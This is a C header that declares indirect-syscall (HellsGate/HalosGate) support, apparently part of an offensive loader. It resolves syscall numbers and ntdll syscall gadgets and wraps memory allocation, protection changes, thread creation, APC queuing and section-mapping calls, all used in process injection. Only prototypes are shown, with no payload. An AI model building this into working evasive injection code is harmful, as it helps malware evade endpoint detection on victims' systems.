/*
 * syscalls.h - Indirect syscall support (HellsGate / HalosGate)
 *
 * Build flag: -DUSE_INDIRECT_SYSCALLS
 * Assembly:   Also compile syscalls_asm.S (update build to find *.S files)
 *
 * When USE_INDIRECT_SYSCALLS is defined, NT API calls bypass
 * GetProcAddress and execute via an indirect syscall instruction
 * found within ntdll.dll itself, avoiding execution from
 * non-ntdll memory regions.
 */

#ifndef SYSCALLS_H
#define SYSCALLS_H

#if USE_INDIRECT_SYSCALLS

#include <windows.h>

/* ------------------------------------------------------------------ */
/*  Syscall entry: resolved SSN + address of a syscall gadget in ntdll */
/* ------------------------------------------------------------------ */

typedef struct _syscall_entry {
    DWORD ssn;           /* syscall service number           */
    PVOID syscall_addr;  /* address of syscall;ret in ntdll  */
} syscall_entry_t;

/* ------------------------------------------------------------------ */
/*  Resolver: populates a syscall_entry_t for the given Nt* function   */
/* ------------------------------------------------------------------ */

BOOL resolve_syscall(const char *name, syscall_entry_t *entry);

/*
 * Initialise all syscall entries at once.
 * Returns FALSE if any resolution fails.
 */
BOOL syscalls_init(void);

/* ------------------------------------------------------------------ */
/*  Per-function global entries (defined in syscalls.c)                 */
/*  The assembly stubs in syscalls_asm.S reference these by name.      */
/* ------------------------------------------------------------------ */

extern syscall_entry_t sc_NtAllocateVirtualMemory;
extern syscall_entry_t sc_NtProtectVirtualMemory;
extern syscall_entry_t sc_NtCreateThreadEx;
extern syscall_entry_t sc_NtQueueApcThread;
extern syscall_entry_t sc_NtTestAlert;
extern syscall_entry_t sc_NtWaitForSingleObject;
extern syscall_entry_t sc_NtCreateSection;
extern syscall_entry_t sc_NtMapViewOfSection;

/* ------------------------------------------------------------------ */
/*  Indirect-syscall wrapper prototypes (implemented in syscalls_asm.S) */
/*  Signatures match the existing fnNt* typedefs in ntapi.h.           */
/* ------------------------------------------------------------------ */

NTSTATUS IndirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

NTSTATUS IndirectNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

NTSTATUS IndirectNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize,
    PVOID AttributeList);

NTSTATUS IndirectNtQueueApcThread(
    HANDLE ThreadHandle, PVOID ApcRoutine,
    PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

NTSTATUS IndirectNtTestAlert(VOID);

NTSTATUS IndirectNtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);

NTSTATUS IndirectNtCreateSection(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

NTSTATUS IndirectNtMapViewOfSection(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

#endif /* USE_INDIRECT_SYSCALLS */

#endif /* SYSCALLS_H */
